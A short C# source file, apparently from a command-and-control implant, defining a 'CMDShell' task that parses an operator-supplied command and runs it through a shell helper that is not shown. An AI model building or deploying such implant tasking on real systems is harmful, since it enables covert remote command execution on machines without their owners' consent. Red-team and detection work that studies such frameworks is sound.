 using Implant.Models;
using Implant.Utils;

namespace Implant.Tasks.Execute
{
    class CMDShell : ImplantCommands
    {
        private string Command { get; set; }
        private string Args { get; set; }
        public override string Name => "CMDShell";
        public override string Execute(ImplantTask task)
        {
            var opts = ImplantOptionUtils.ReturnMethod(task);
            Args = task.Args.Replace("\\", "");
            var args = ImplantOptionUtils.ParseArgs(Args);

            foreach (var opt in opts)
            {
                foreach (var _params in args.Params)
                {
                    if ((_params.OptionName.ToLower() is "command")
                        && (_params.OptionName.ToLower() == opt.GetPropertyValue("Name").ToString().ToLower()))
                    {
                        Command = _params.OptionValue;
                    }
                }
            }

            var cmd = CMDShellFunctions.CreateInstance();
            return CMDShellFunctions.Execute(cmd, Command).Trim('\n');
        }    }
}
